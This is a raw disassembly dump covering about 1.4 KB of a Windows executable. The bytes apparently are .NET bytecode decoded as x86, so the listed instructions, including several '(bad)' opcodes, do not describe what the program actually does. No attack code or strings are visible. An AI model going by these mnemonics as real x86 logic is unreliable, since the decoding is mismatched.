  403695:	10 00                	adc    %al,(%eax)
  403697:	00 00                	add    %al,(%eax)
  403699:	00 2a                	add    %ch,(%edx)
  40369b:	00 1d 47 00 27 16    	add    %bl,0x16270047
  4036a1:	00 00                	add    %al,(%eax)
  4036a3:	01 1b                	add    %ebx,(%ebx)
  4036a5:	30 05 00 82 00 00    	xor    %al,0x8200
  4036ab:	00 11                	add    %dl,(%ecx)
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	11 00                	adc    %eax,(%eax)
  4036b1:	02 72 2c             	add    0x2c(%edx),%dh
  4036b4:	43                   	inc    %ebx
  4036b5:	00 70 7e             	add    %dh,0x7e(%eax)
  4036b8:	0b 00                	or     (%eax),%eax
  4036ba:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  4036bd:	12 01                	adc    (%ecx),%al
  4036bf:	fe                   	(bad)
  4036c0:	16                   	push   %ss
  4036c1:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  4036c6:	14 00                	adc    $0x0,%al
  4036c8:	00 0a                	add    %cl,(%edx)
  4036ca:	72 8a                	jb     0x403656
  4036cc:	43                   	inc    %ebx
  4036cd:	00 70 0f             	add    %dh,0xf(%eax)
  4036d0:	01 28                	add    %ebp,(%eax)
  4036d2:	24 00                	and    $0x0,%al
  4036d4:	00 0a                	add    %cl,(%edx)
  4036d6:	28 3f                	sub    %bh,(%edi)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	0a 6f 18             	or     0x18(%edi),%ch
  4036dd:	00 00                	add    %al,(%eax)
  4036df:	0a 00                	or     (%eax),%al
  4036e1:	00 02                	add    %al,(%edx)
  4036e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e4:	19 00                	sbb    %eax,(%eax)
  4036e6:	00 0a                	add    %cl,(%edx)
  4036e8:	0a 06                	or     (%esi),%al
  4036ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4036eb:	1f                   	pop    %ds
  4036ec:	00 00                	add    %al,(%eax)
  4036ee:	0a 00                	or     (%eax),%al
  4036f0:	72 a6                	jb     0x403698
  4036f2:	43                   	inc    %ebx
  4036f3:	00 70 28             	add    %dh,0x28(%eax)
  4036f6:	1e                   	push   %ds
  4036f7:	00 00                	add    %al,(%eax)
  4036f9:	0a 00                	or     (%eax),%al
  4036fb:	00 de                	add    %bl,%dh
  4036fd:	27                   	daa
  4036fe:	0c 00                	or     $0x0,%al
  403700:	72 d6                	jb     0x4036d8
  403702:	43                   	inc    %ebx
  403703:	00 70 28             	add    %dh,0x28(%eax)
  403706:	1e                   	push   %ds
  403707:	00 00                	add    %al,(%eax)
  403709:	0a 00                	or     (%eax),%al
  40370b:	72 e8                	jb     0x4036f5
  40370d:	11 00                	adc    %eax,(%eax)
  40370f:	70 08                	jo     0x403719
  403711:	6f                   	outsl  %ds:(%esi),(%dx)
  403712:	21 00                	and    %eax,(%eax)
  403714:	00 0a                	add    %cl,(%edx)
  403716:	28 22                	sub    %ah,(%edx)
  403718:	00 00                	add    %al,(%eax)
  40371a:	0a 28                	or     (%eax),%ch
  40371c:	1e                   	push   %ds
  40371d:	00 00                	add    %al,(%eax)
  40371f:	0a 00                	or     (%eax),%al
  403721:	16                   	push   %ss
  403722:	0d de 0b 06 6f       	or     $0x6f060bde,%eax
  403727:	1f                   	pop    %ds
  403728:	00 00                	add    %al,(%eax)
  40372a:	0a 00                	or     (%eax),%al
  40372c:	17                   	pop    %ss
  40372d:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  403732:	00 00                	add    %al,(%eax)
  403734:	01 10                	add    %edx,(%eax)
  403736:	00 00                	add    %al,(%eax)
  403738:	00 00                	add    %al,(%eax)
  40373a:	31 00                	xor    %eax,(%eax)
  40373c:	1d 4e 00 27 16       	sbb    $0x1627004e,%eax
  403741:	00 00                	add    %al,(%eax)
  403743:	01 1b                	add    %ebx,(%ebx)
  403745:	30 05 00 82 00 00    	xor    %al,0x8200
  40374b:	00 11                	add    %dl,(%ecx)
  40374d:	00 00                	add    %al,(%eax)
  40374f:	11 00                	adc    %eax,(%eax)
  403751:	02 72 28             	add    0x28(%edx),%dh
  403754:	44                   	inc    %esp
  403755:	00 70 7e             	add    %dh,0x7e(%eax)
  403758:	0b 00                	or     (%eax),%eax
  40375a:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40375d:	12 01                	adc    (%ecx),%al
  40375f:	fe                   	(bad)
  403760:	16                   	push   %ss
  403761:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  403766:	14 00                	adc    $0x0,%al
  403768:	00 0a                	add    %cl,(%edx)
  40376a:	72 8a                	jb     0x4036f6
  40376c:	43                   	inc    %ebx
  40376d:	00 70 0f             	add    %dh,0xf(%eax)
  403770:	01 28                	add    %ebp,(%eax)
  403772:	24 00                	and    $0x0,%al
  403774:	00 0a                	add    %cl,(%edx)
  403776:	28 3f                	sub    %bh,(%edi)
  403778:	00 00                	add    %al,(%eax)
  40377a:	0a 6f 18             	or     0x18(%edi),%ch
  40377d:	00 00                	add    %al,(%eax)
  40377f:	0a 00                	or     (%eax),%al
  403781:	00 02                	add    %al,(%edx)
  403783:	6f                   	outsl  %ds:(%esi),(%dx)
  403784:	19 00                	sbb    %eax,(%eax)
  403786:	00 0a                	add    %cl,(%edx)
  403788:	0a 06                	or     (%esi),%al
  40378a:	6f                   	outsl  %ds:(%esi),(%dx)
  40378b:	1f                   	pop    %ds
  40378c:	00 00                	add    %al,(%eax)
  40378e:	0a 00                	or     (%eax),%al
  403790:	72 90                	jb     0x403722
  403792:	44                   	inc    %esp
  403793:	00 70 28             	add    %dh,0x28(%eax)
  403796:	1e                   	push   %ds
  403797:	00 00                	add    %al,(%eax)
  403799:	0a 00                	or     (%eax),%al
  40379b:	00 de                	add    %bl,%dh
  40379d:	27                   	daa
  40379e:	0c 00                	or     $0x0,%al
  4037a0:	72 c8                	jb     0x40376a
  4037a2:	44                   	inc    %esp
  4037a3:	00 70 28             	add    %dh,0x28(%eax)
  4037a6:	1e                   	push   %ds
  4037a7:	00 00                	add    %al,(%eax)
  4037a9:	0a 00                	or     (%eax),%al
  4037ab:	72 e8                	jb     0x403795
  4037ad:	11 00                	adc    %eax,(%eax)
  4037af:	70 08                	jo     0x4037b9
  4037b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037b2:	21 00                	and    %eax,(%eax)
  4037b4:	00 0a                	add    %cl,(%edx)
  4037b6:	28 22                	sub    %ah,(%edx)
  4037b8:	00 00                	add    %al,(%eax)
  4037ba:	0a 28                	or     (%eax),%ch
  4037bc:	1e                   	push   %ds
  4037bd:	00 00                	add    %al,(%eax)
  4037bf:	0a 00                	or     (%eax),%al
  4037c1:	16                   	push   %ss
  4037c2:	0d de 0b 06 6f       	or     $0x6f060bde,%eax
  4037c7:	1f                   	pop    %ds
  4037c8:	00 00                	add    %al,(%eax)
  4037ca:	0a 00                	or     (%eax),%al
  4037cc:	17                   	pop    %ss
  4037cd:	0d 2b 00 09 2a       	or     $0x2a09002b,%eax
  4037d2:	00 00                	add    %al,(%eax)
  4037d4:	01 10                	add    %edx,(%eax)
  4037d6:	00 00                	add    %al,(%eax)
  4037d8:	00 00                	add    %al,(%eax)
  4037da:	31 00                	xor    %eax,(%eax)
  4037dc:	1d 4e 00 27 16       	sbb    $0x1627004e,%eax
  4037e1:	00 00                	add    %al,(%eax)
  4037e3:	01 22                	add    %esp,(%edx)
  4037e5:	02 28                	add    (%eax),%ch
  4037e7:	25 00 00 0a 00       	and    $0xa0000,%eax
  4037ec:	2a 32                	sub    (%edx),%dh
  4037ee:	00 28                	add    %ch,(%eax)
  4037f0:	40                   	inc    %eax
  4037f1:	00 00                	add    %al,(%eax)
  4037f3:	0a 80 09 00 00 04    	or     0x4000009(%eax),%al
  4037f9:	2a 32                	sub    (%edx),%dh
  4037fb:	00 28                	add    %ch,(%eax)
  4037fd:	40                   	inc    %eax
  4037fe:	00 00                	add    %al,(%eax)
  403800:	0a 80 0a 00 00 04    	or     0x400000a(%eax),%al
  403806:	2a 32                	sub    (%edx),%dh
  403808:	00 28                	add    %ch,(%eax)
  40380a:	40                   	inc    %eax
  40380b:	00 00                	add    %al,(%eax)
  40380d:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  403813:	2a 22                	sub    (%edx),%ah
  403815:	02 28                	add    (%eax),%ch
  403817:	25 00 00 0a 00       	and    $0xa0000,%eax
  40381c:	2a 22                	sub    (%edx),%ah
  40381e:	02 28                	add    (%eax),%ch
  403820:	25 00 00 0a 00       	and    $0xa0000,%eax
  403825:	2a 82 00 28 25 00    	sub    0x252800(%edx),%al
  40382b:	00 06                	add    %al,(%esi)
  40382d:	00 28                	add    %ch,(%eax)
  40382f:	22 00                	and    (%eax),%al
  403831:	00 06                	add    %al,(%esi)
  403833:	00 28                	add    %ch,(%eax)
  403835:	24 00                	and    $0x0,%al
  403837:	00 06                	add    %al,(%esi)
  403839:	00 28                	add    %ch,(%eax)
  40383b:	23 00                	and    (%eax),%eax
  40383d:	00 06                	add    %al,(%esi)
  40383f:	00 28                	add    %ch,(%eax)
  403841:	21 00                	and    %eax,(%eax)
  403843:	00 06                	add    %al,(%esi)
  403845:	00 2a                	add    %ch,(%edx)
  403847:	00 13                	add    %dl,(%ebx)
  403849:	30 03                	xor    %al,(%ebx)
  40384b:	00 81 00 00 00 12    	add    %al,0x12000000(%ecx)
  403851:	00 00                	add    %al,(%eax)
  403853:	11 00                	adc    %eax,(%eax)
  403855:	7e 23                	jle    0x40387a
  403857:	00 00                	add    %al,(%eax)
  403859:	0a 0a                	or     (%edx),%cl
  40385b:	7e 31                	jle    0x40388e
  40385d:	00 00                	add    %al,(%eax)
  40385f:	04 72                	add    $0x72,%al
  403861:	24 45                	and    $0x45,%al
  403863:	00 70 72             	add    %dh,0x72(%eax)
  403866:	84 45 00             	test   %al,0x0(%ebp)
  403869:	70 28                	jo     0x403893
  40386b:	53                   	push   %ebx
  40386c:	00 00                	add    %al,(%eax)
  40386e:	06                   	push   %es
  40386f:	0a 06                	or     (%esi),%al
  403871:	72 9a                	jb     0x40380d
  403873:	45                   	inc    %ebp
  403874:	00 70 28             	add    %dh,0x28(%eax)
  403877:	3e 00 00             	add    %al,%ds:(%eax)
  40387a:	0a 0b                	or     (%ebx),%cl
  40387c:	07                   	pop    %es
  40387d:	2c 3a                	sub    $0x3a,%al
  40387f:	00 7e 31             	add    %bh,0x31(%esi)
  403882:	00 00                	add    %al,(%eax)
  403884:	04 72                	add    $0x72,%al
  403886:	24 45                	and    $0x45,%al
  403888:	00 70 72             	add    %dh,0x72(%eax)
  40388b:	84 45 00             	test   %al,0x0(%ebp)
  40388e:	70 28                	jo     0x4038b8
  403890:	54                   	push   %esp
  403891:	00 00                	add    %al,(%eax)
  403893:	06                   	push   %es
  403894:	0a 06                	or     (%esi),%al
  403896:	72 9a                	jb     0x403832
  403898:	45                   	inc    %ebp
  403899:	00 70 28             	add    %dh,0x28(%eax)
  40389c:	3e 00 00             	add    %al,%ds:(%eax)
  40389f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038a2:	2c 14                	sub    $0x14,%al
  4038a4:	00 16                	add    %dl,(%esi)
  4038a6:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4038aa:	04 72                	add    $0x72,%al
  4038ac:	c4 45 00             	les    0x0(%ebp),%eax
  4038af:	70 28                	jo     0x4038d9
  4038b1:	1e                   	push   %ds
  4038b2:	00 00                	add    %al,(%eax)
  4038b4:	0a 00                	or     (%eax),%al
  4038b6:	2b 1c 00             	sub    (%eax,%eax,1),%ebx
  4038b9:	06                   	push   %es
  4038ba:	28 26                	sub    %ah,(%esi)
  4038bc:	00 00                	add    %al,(%eax)
  4038be:	06                   	push   %es
  4038bf:	0a 06                	or     (%esi),%al
  4038c1:	28 27                	sub    %ah,(%edi)
  4038c3:	00 00                	add    %al,(%eax)
  4038c5:	06                   	push   %es
  4038c6:	0a 06                	or     (%esi),%al
  4038c8:	28 41 00             	sub    %al,0x0(%ecx)
  4038cb:	00 0a                	add    %cl,(%edx)
  4038cd:	80 10 00             	adcb   $0x0,(%eax)
  4038d0:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4038d3:	00 2a                	add    %ch,(%edx)
  4038d5:	5a                   	pop    %edx
  4038d6:	00 72 49             	add    %dh,0x49(%edx)
  4038d9:	46                   	inc    %esi
  4038da:	00 70 28             	add    %dh,0x28(%eax)
  4038dd:	42                   	inc    %edx
  4038de:	00 00                	add    %al,(%eax)
  4038e0:	0a 6f 43             	or     0x43(%edi),%ch
  4038e3:	00 00                	add    %al,(%eax)
  4038e5:	0a 80 11 00 00 04    	or     0x4000011(%eax),%al
  4038eb:	2a 13                	sub    (%ebx),%dl
  4038ed:	30 03                	xor    %al,(%ebx)
  4038ef:	00 f7                	add    %dh,%bh
  4038f1:	00 00                	add    %al,(%eax)
  4038f3:	00 13                	add    %dl,(%ebx)
  4038f5:	00 00                	add    %al,(%eax)
  4038f7:	11 00                	adc    %eax,(%eax)
  4038f9:	7e 23                	jle    0x40391e
  4038fb:	00 00                	add    %al,(%eax)
  4038fd:	0a 0a                	or     (%edx),%cl
  4038ff:	7e 31                	jle    0x403932
  403901:	00 00                	add    %al,(%eax)
  403903:	04 72                	add    $0x72,%al
  403905:	24 45                	and    $0x45,%al
  403907:	00 70 72             	add    %dh,0x72(%eax)
  40390a:	5d                   	pop    %ebp
  40390b:	46                   	inc    %esi
  40390c:	00 70 28             	add    %dh,0x28(%eax)
  40390f:	53                   	push   %ebx
  403910:	00 00                	add    %al,(%eax)
  403912:	06                   	push   %es
  403913:	0a 06                	or     (%esi),%al
  403915:	72 9a                	jb     0x4038b1
  403917:	45                   	inc    %ebp
  403918:	00 70 28             	add    %dh,0x28(%eax)
  40391b:	3e 00 00             	add    %al,%ds:(%eax)
  40391e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403921:	2c 3d                	sub    $0x3d,%al
  403923:	00 7e 31             	add    %bh,0x31(%esi)
  403926:	00 00                	add    %al,(%eax)
  403928:	04 72                	add    $0x72,%al
  40392a:	24 45                	and    $0x45,%al
  40392c:	00 70 72             	add    %dh,0x72(%eax)
  40392f:	5d                   	pop    %ebp
  403930:	46                   	inc    %esi
  403931:	00 70 28             	add    %dh,0x28(%eax)
  403934:	54                   	push   %esp
  403935:	00 00                	add    %al,(%eax)
  403937:	06                   	push   %es
  403938:	0a 06                	or     (%esi),%al
  40393a:	72 9a                	jb     0x4038d6
  40393c:	45                   	inc    %ebp
  40393d:	00 70 28             	add    %dh,0x28(%eax)
  403940:	3e 00 00             	add    %al,%ds:(%eax)
  403943:	0a 0d 09 2c 17 00    	or     0x172c09,%cl
  403949:	16                   	push   %ss
  40394a:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  40394e:	04 72                	add    $0x72,%al
  403950:	c4 45 00             	les    0x0(%ebp),%eax
  403953:	70 28                	jo     0x40397d
  403955:	1e                   	push   %ds
  403956:	00 00                	add    %al,(%eax)
  403958:	0a 00                	or     (%eax),%al
  40395a:	38 8f 00 00 00 00    	cmp    %cl,0x0(%edi)
  403960:	06                   	push   %es
  403961:	28 26                	sub    %ah,(%esi)
  403963:	00 00                	add    %al,(%eax)
  403965:	06                   	push   %es
  403966:	0a 06                	or     (%esi),%al
  403968:	28 27                	sub    %ah,(%edi)
  40396a:	00 00                	add    %al,(%eax)
  40396c:	06                   	push   %es
  40396d:	80 0e 00             	orb    $0x0,(%esi)
  403970:	00 04 7e             	add    %al,(%esi,%edi,2)
  403973:	23 00                	and    (%eax),%eax
  403975:	00 0a                	add    %cl,(%edx)
  403977:	0b 7e 31             	or     0x31(%esi),%edi
  40397a:	00 00                	add    %al,(%eax)
  40397c:	04 72                	add    $0x72,%al
  40397e:	24 45                	and    $0x45,%al
  403980:	00 70 72             	add    %dh,0x72(%eax)
  403983:	79 46                	jns    0x4039cb
  403985:	00 70 28             	add    %dh,0x28(%eax)
  403988:	53                   	push   %ebx
  403989:	00 00                	add    %al,(%eax)
  40398b:	06                   	push   %es
  40398c:	0b 07                	or     (%edi),%eax
  40398e:	72 9a                	jb     0x40392a
  403990:	45                   	inc    %ebp
  403991:	00 70 28             	add    %dh,0x28(%eax)
  403994:	3e 00 00             	add    %al,%ds:(%eax)
  403997:	0a 13                	or     (%ebx),%dl
  403999:	04 11                	add    $0x11,%al
  40399b:	04 2c                	add    $0x2c,%al
  40399d:	3c 00                	cmp    $0x0,%al
  40399f:	7e 31                	jle    0x4039d2
  4039a1:	00 00                	add    %al,(%eax)
  4039a3:	04 72                	add    $0x72,%al
  4039a5:	24 45                	and    $0x45,%al
  4039a7:	00 70 72             	add    %dh,0x72(%eax)
  4039aa:	79 46                	jns    0x4039f2
  4039ac:	00 70 28             	add    %dh,0x28(%eax)
  4039af:	54                   	push   %esp
  4039b0:	00 00                	add    %al,(%eax)
  4039b2:	06                   	push   %es
  4039b3:	0b 07                	or     (%edi),%eax
  4039b5:	72 9a                	jb     0x403951
  4039b7:	45                   	inc    %ebp
  4039b8:	00 70 28             	add    %dh,0x28(%eax)
  4039bb:	3e 00 00             	add    %al,%ds:(%eax)
  4039be:	0a 13                	or     (%ebx),%dl
  4039c0:	05 11 05 2c 14       	add    $0x142c0511,%eax
  4039c5:	00 16                	add    %dl,(%esi)
  4039c7:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4039cb:	04 72                	add    $0x72,%al
  4039cd:	c4 45 00             	les    0x0(%ebp),%eax
  4039d0:	70 28                	jo     0x4039fa
  4039d2:	1e                   	push   %ds
  4039d3:	00 00                	add    %al,(%eax)
  4039d5:	0a 00                	or     (%eax),%al
  4039d7:	2b 15 00 07 28 26    	sub    0x26280700,%edx
  4039dd:	00 00                	add    %al,(%eax)
  4039df:	06                   	push   %es
  4039e0:	0b 07                	or     (%edi),%eax
  4039e2:	28 27                	sub    %ah,(%edi)
  4039e4:	00 00                	add    %al,(%eax)
  4039e6:	06                   	push   %es
  4039e7:	80 0f 00             	orb    $0x0,(%edi)
  4039ea:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4039ed:	00 2a                	add    %ch,(%edx)
  4039ef:	00 13                	add    %dl,(%ebx)
  4039f1:	30 03                	xor    %al,(%ebx)
  4039f3:	00 78 00             	add    %bh,0x0(%eax)
  4039f6:	00 00                	add    %al,(%eax)
  4039f8:	12 00                	adc    (%eax),%al
  4039fa:	00 11                	add    %dl,(%ecx)
  4039fc:	00 7e 23             	add    %bh,0x23(%esi)
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	0a 0a                	or     (%edx),%cl
  403a03:	7e 31                	jle    0x403a36
  403a05:	00 00                	add    %al,(%eax)
  403a07:	04 72                	add    $0x72,%al
  403a09:	99                   	cltd
  403a0a:	46                   	inc    %esi
  403a0b:	00 70 72             	add    %dh,0x72(%eax)
  403a0e:	f3 46                	repz inc %esi
  403a10:	00 70 28             	add    %dh,0x28(%eax)
  403a13:	53                   	push   %ebx
  403a14:	00 00                	add    %al,(%eax)
  403a16:	06                   	push   %es
  403a17:	0a 06                	or     (%esi),%al
  403a19:	72 9a                	jb     0x4039b5
  403a1b:	45                   	inc    %ebp
  403a1c:	00 70 28             	add    %dh,0x28(%eax)
  403a1f:	3e 00 00             	add    %al,%ds:(%eax)
  403a22:	0a 0b                	or     (%ebx),%cl
  403a24:	07                   	pop    %es
  403a25:	2c 3a                	sub    $0x3a,%al
  403a27:	00 7e 31             	add    %bh,0x31(%esi)
  403a2a:	00 00                	add    %al,(%eax)
  403a2c:	04 72                	add    $0x72,%al
  403a2e:	99                   	cltd
  403a2f:	46                   	inc    %esi
  403a30:	00 70 72             	add    %dh,0x72(%eax)
  403a33:	f3 46                	repz inc %esi
  403a35:	00 70 28             	add    %dh,0x28(%eax)
  403a38:	54                   	push   %esp
  403a39:	00 00                	add    %al,(%eax)
  403a3b:	06                   	push   %es
  403a3c:	0a 06                	or     (%esi),%al
  403a3e:	72 9a                	jb     0x4039da
  403a40:	45                   	inc    %ebp
  403a41:	00 70 28             	add    %dh,0x28(%eax)
  403a44:	3e 00 00             	add    %al,%ds:(%eax)
  403a47:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403a4a:	2c 14                	sub    $0x14,%al
  403a4c:	00 16                	add    %dl,(%esi)
  403a4e:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  403a52:	04 72                	add    $0x72,%al
  403a54:	0b 47 00             	or     0x0(%edi),%eax
  403a57:	70 28                	jo     0x403a81
  403a59:	1e                   	push   %ds
  403a5a:	00 00                	add    %al,(%eax)
  403a5c:	0a 00                	or     (%eax),%al
  403a5e:	2b 13                	sub    (%ebx),%edx
  403a60:	00 06                	add    %al,(%esi)
  403a62:	28 26                	sub    %ah,(%esi)
  403a64:	00 00                	add    %al,(%eax)
  403a66:	06                   	push   %es
  403a67:	0a 06                	or     (%esi),%al
  403a69:	28 27                	sub    %ah,(%edi)
  403a6b:	00 00                	add    %al,(%eax)
  403a6d:	06                   	push   %es
  403a6e:	80 0d 00 00 04 2a 13 	orb    $0x13,0x2a040000
  403a75:	30 03                	xor    %al,(%ebx)
  403a77:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  403a7b:	00 14 00             	add    %dl,(%eax,%eax,1)
  403a7e:	00 11                	add    %dl,(%ecx)
  403a80:	00 7e 23             	add    %bh,0x23(%esi)
  403a83:	00 00                	add    %al,(%eax)
  403a85:	0a 0a                	or     (%edx),%cl
  403a87:	7e 31                	jle    0x403aba
  403a89:	00 00                	add    %al,(%eax)
  403a8b:	04 72                	add    $0x72,%al
  403a8d:	24 45                	and    $0x45,%al
  403a8f:	00 70 72             	add    %dh,0x72(%eax)
  403a92:	71 47                	jno    0x403adb
  403a94:	00 70 28             	add    %dh,0x28(%eax)
  403a97:	53                   	push   %ebx
  403a98:	00 00                	add    %al,(%eax)
  403a9a:	06                   	push   %es
  403a9b:	0a 06                	or     (%esi),%al
  403a9d:	72 9a                	jb     0x403a39
  403a9f:	45                   	inc    %ebp
  403aa0:	00 70 28             	add    %dh,0x28(%eax)
  403aa3:	3e 00 00             	add    %al,%ds:(%eax)
  403aa6:	0a 0b                	or     (%ebx),%cl
  403aa8:	07                   	pop    %es
  403aa9:	2c 2f                	sub    $0x2f,%al
  403aab:	00 7e 31             	add    %bh,0x31(%esi)
  403aae:	00 00                	add    %al,(%eax)
  403ab0:	04 72                	add    $0x72,%al
  403ab2:	24 45                	and    $0x45,%al
  403ab4:	00 70 72             	add    %dh,0x72(%eax)
  403ab7:	71 47                	jno    0x403b00
  403ab9:	00 70 28             	add    %dh,0x28(%eax)
  403abc:	54                   	push   %esp
  403abd:	00 00                	add    %al,(%eax)
  403abf:	06                   	push   %es
  403ac0:	0a 06                	or     (%esi),%al
  403ac2:	72 9a                	jb     0x403a5e
  403ac4:	45                   	inc    %ebp
  403ac5:	00 70 28             	add    %dh,0x28(%eax)
  403ac8:	3e 00 00             	add    %al,%ds:(%eax)
  403acb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403ace:	2c 09                	sub    $0x9,%al
  403ad0:	00 16                	add    %dl,(%esi)
  403ad2:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  403ad6:	04 2b                	add    $0x2b,%al
  403ad8:	22 00                	and    (%eax),%al
  403ada:	06                   	push   %es
  403adb:	72 83                	jb     0x403a60
  403add:	47                   	inc    %edi
  403ade:	00 70 28             	add    %dh,0x28(%eax)
  403ae1:	3e 00 00             	add    %al,%ds:(%eax)
  403ae4:	0a 0d 09 2c 0a 00    	or     0xa2c09,%cl
  403aea:	17                   	pop    %ss
  403aeb:	80 13 00             	adcb   $0x0,(%ebx)
  403aee:	00 04 00             	add    %al,(%eax,%eax,1)
  403af1:	2b 08                	sub    (%eax),%ecx
  403af3:	00 16                	add    %dl,(%esi)
  403af5:	80 13 00             	adcb   $0x0,(%ebx)
  403af8:	00 04 00             	add    %al,(%eax,%eax,1)
  403afb:	2a 13                	sub    (%ebx),%dl
  403afd:	30 03                	xor    %al,(%ebx)
  403aff:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  403b03:	00 15 00 00 11 00    	add    %dl,0x110000
  403b09:	7e 23                	jle    0x403b2e
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	16                   	push   %ss
  403b10:	0b 2b                	or     (%ebx),%ebp
  403b12:	2a 00                	sub    (%eax),%al
  403b14:	02 07                	add    (%edi),%al
  403b16:	18 6f 44             	sbb    %ch,0x44(%edi)
  403b19:	00 00                	add    %al,(%eax)
  403b1b:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403b1e:	1f                   	pop    %ds
  403b1f:	10 28                	adc    %ch,(%eax)
  403b21:	45                   	inc    %ebp
  403b22:	00 00                	add    %al,(%eax)
  403b24:	0a 0d 09 d1 13 04    	or     0x413d109,%cl
  403b2a:	06                   	push   %es
  403b2b:	12 04 28             	adc    (%eax,%ebp,1),%al
  403b2e:	46                   	inc    %esi
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	0a 28                	or     (%eax),%ch
  403b33:	22 00                	and    (%eax),%al
  403b35:	00 0a                	add    %cl,(%edx)
  403b37:	0a 00                	or     (%eax),%al
  403b39:	07                   	pop    %es
  403b3a:	18 58 0b             	sbb    %bl,0xb(%eax)
  403b3d:	07                   	pop    %es
  403b3e:	02 6f 3c             	add    0x3c(%edi),%ch
  403b41:	00 00                	add    %al,(%eax)
  403b43:	0a fe                	or     %dh,%bh
  403b45:	04 13                	add    $0x13,%al
  403b47:	05 11 05 2d c7       	add    $0xc72d0511,%eax
  403b4c:	06                   	push   %es
  403b4d:	13 06                	adc    (%esi),%eax
  403b4f:	2b 00                	sub    (%eax),%eax
  403b51:	11 06                	adc    %eax,(%esi)
  403b53:	2a 13                	sub    (%ebx),%dl
  403b55:	30 01                	xor    %al,(%ecx)
  403b57:	00 1a                	add    %bl,(%edx)
  403b59:	00 00                	add    %al,(%eax)
  403b5b:	00 16                	add    %dl,(%esi)
  403b5d:	00 00                	add    %al,(%eax)
  403b5f:	11 00                	adc    %eax,(%eax)
  403b61:	02 6f 47             	add    0x47(%edi),%ch
  403b64:	00 00                	add    %al,(%eax)
  403b66:	0a 0a                	or     (%edx),%cl
  403b68:	06                   	push   %es
  403b69:	28 48 00             	sub    %cl,0x0(%eax)
  403b6c:	00 0a                	add    %cl,(%edx)
  403b6e:	00 06                	add    %al,(%esi)
  403b70:	73 49                	jae    0x403bbb
  403b72:	00 00                	add    %al,(%eax)
  403b74:	0a 0b                	or     (%ebx),%cl
  403b76:	2b 00                	sub    (%eax),%eax
  403b78:	07                   	pop    %es
  403b79:	2a 22                	sub    (%edx),%ah
  403b7b:	02 28                	add    (%eax),%ch
  403b7d:	25 00 00 0a 00       	and    $0xa0000,%eax
  403b82:	2a 1e                	sub    (%esi),%bl
  403b84:	17                   	pop    %ss
  403b85:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  403b89:	04 2a                	add    $0x2a,%al
  403b8b:	00 1b                	add    %bl,(%ebx)
  403b8d:	30 05 00 a2 00 00    	xor    %al,0xa200
  403b93:	00 11                	add    %dl,(%ecx)
  403b95:	00 00                	add    %al,(%eax)
  403b97:	11 00                	adc    %eax,(%eax)
  403b99:	02 1d 8d 23 00 00    	add    0x238d,%bl
  403b9f:	01 25 16 72 89 47    	add    %esp,0x47897216
  403ba5:	00 70 a2             	add    %dh,-0x5e(%eax)
  403ba8:	25 17 03 a2 25       	and    $0x25a20317,%eax
  403bad:	18 72 c9             	sbb    %dh,-0x37(%edx)
  403bb0:	47                   	inc    %edi
  403bb1:	00 70 a2             	add    %dh,-0x5e(%eax)
  403bb4:	25 19 7e 0b 00       	and    $0xb7e19,%eax
  403bb9:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  403bbc:	12 01                	adc    (%ecx),%al
  403bbe:	fe                   	(bad)
  403bbf:	16                   	push   %ss
  403bc0:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  403bc5:	14 00                	adc    $0x0,%al
  403bc7:	00 0a                	add    %cl,(%edx)
  403bc9:	a2 25 1a 72 2f       	mov    %al,0x2f721a25
  403bce:	48                   	dec    %eax
  403bcf:	00 70 a2             	add    %dh,-0x5e(%eax)
  403bd2:	25 1b 04 a2 25       	and    $0x25a2041b,%eax
  403bd7:	1c 72                	sbb    $0x72,%al
  403bd9:	4f                   	dec    %edi
  403bda:	48                   	dec    %eax
  403bdb:	00 70 a2             	add    %dh,-0x5e(%eax)
  403bde:	28 17                	sub    %dl,(%edi)
  403be0:	00 00                	add    %al,(%eax)
  403be2:	0a 6f 18             	or     0x18(%edi),%ch
  403be5:	00 00                	add    %al,(%eax)
  403be7:	0a 00                	or     (%eax),%al
  403be9:	00 02                	add    %al,(%edx)
  403beb:	6f                   	outsl  %ds:(%esi),(%dx)
  403bec:	19 00                	sbb    %eax,(%eax)
  403bee:	00 0a                	add    %cl,(%edx)
  403bf0:	0a 06                	or     (%esi),%al
  403bf2:	6f                   	outsl  %ds:(%esi),(%dx)
  403bf3:	1f                   	pop    %ds
  403bf4:	00 00                	add    %al,(%eax)
  403bf6:	0a 00                	or     (%eax),%al
  403bf8:	72 d4                	jb     0x403bce
  403bfa:	48                   	dec    %eax
  403bfb:	00 70 28             	add    %dh,0x28(%eax)
  403bfe:	1e                   	push   %ds
  403bff:	00 00                	add    %al,(%eax)
  403c01:	0a 00                	or     (%eax),%al
  403c03:	00 de                	add    %bl,%dh
  403c05:	27                   	daa
  403c06:	0c 00                	or     $0x0,%al
  403c08:	72 f4                	jb     0x403bfe
  403c0a:	48                   	dec    %eax
